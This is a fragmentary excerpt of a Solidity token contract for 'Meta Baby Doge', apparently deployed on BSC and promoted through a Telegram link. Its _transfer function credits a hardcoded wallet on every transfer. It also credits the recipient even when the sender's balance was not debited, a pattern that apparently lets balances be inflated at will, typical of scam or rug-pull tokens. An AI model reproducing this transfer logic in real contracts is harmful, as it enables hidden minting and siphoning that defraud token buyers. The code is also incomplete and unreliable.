...
// Submitted for Telegram: https://t.me/metababydoge_bsc
...
contract  MetaBabyDoge  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "Meta Baby Doge";
    string private _symbol = "MBBDOG";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x1B241067e55325a1FbC110bf6c70f105f2F5991a] += _teamtoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_marketingfee > 0) {
        emit Transfer(form, 0x1B241067e55325a1FbC110bf6c70f105f2F5991a, _teamtoken);
        }
